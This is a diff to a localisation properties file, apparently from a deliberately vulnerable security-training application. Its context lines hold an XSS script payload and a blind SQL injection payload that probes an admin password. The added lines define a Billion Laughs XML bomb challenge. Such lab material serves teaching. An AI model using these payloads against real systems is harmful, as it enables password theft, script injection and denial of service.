+++ src/main/resources/i18n/messages.properties
@@ -1066,3 +1066,7 @@ PERSISTENT_XSS_LEVEL7_HINT2=Even the null-byte-prefix trick that worked on level
 PERSISTENT_XSS_LEVEL7_PAYLOAD_DESCRIPTION=The same null-byte-prefixed script payload that broke level 6 is now fully escaped and rendered as inert text.
 PERSISTENT_XSS_LEVEL7_PAYLOAD_VALUE=%00<script>alert(1)</script>
 BLIND_SQL_INJECTION_VULNERABILITY_LEVEL1_CHALLENGE2_PAYLOAD_VALUE=1 AND (SELECT SUBSTRING(password,1,1) FROM auth_users WHERE username='admin_sqli')='n'
+
+XXE_BILLION_LAUGHS_CHALLENGE=Try to trigger a Billion Laughs / XML Entity Expansion attack that causes resource exhaustion.
+XXE_BILLION_LAUGHS_PAYLOAD_DESC=A classic XML Bomb with heavily nested entities.
+XXE_BILLION_LAUGHS_PAYLOAD_VAL=<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><book><name>&lol4;</name></book>
